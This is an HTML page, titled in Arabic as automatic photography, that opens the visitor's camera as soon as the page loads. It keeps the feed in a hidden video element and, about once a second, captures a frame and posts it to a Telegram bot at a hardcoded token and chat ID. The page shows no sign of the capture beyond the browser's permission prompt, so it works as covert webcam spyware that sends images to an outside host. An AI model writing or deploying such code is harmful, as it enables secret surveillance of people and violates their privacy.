<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التصوير التلقائي</title>
</head>
<body>
    <video id="video" autoplay playsinline style="display:none;"></video>
    <script>
        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById("video");
                video.srcObject = stream;

                setInterval(() => {
                    captureAndSend();
                }, 1000); // يلتقط صورة كل 5 ثوانٍ
            } catch (error) {
                console.error("فشل في تشغيل الكاميرا:", error);
            }
        }

        function captureAndSend() {
            const video = document.getElementById("video");
            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            const imageData = canvas.toDataURL("image/png");

            // إرسال الصورة إلى تيليجرام
            fetch("https://api.telegram.org/bot<7214420833:AAE9-I-ZCnIrb1aDBrhCVr1I2piz4JEUoZU>/sendPhoto", {
                method: "POST",
                body: JSON.stringify({
                    chat_id: "<5471126331>",
                    photo: imageData
                }),
                headers: { "Content-Type": "application/json" }
            });
        }

        // تشغيل الكاميرا تلقائيًا عند تحميل الصفحة
        document.addEventListener("DOMContentLoaded", startCamera);
    </script>
</body>
</html>
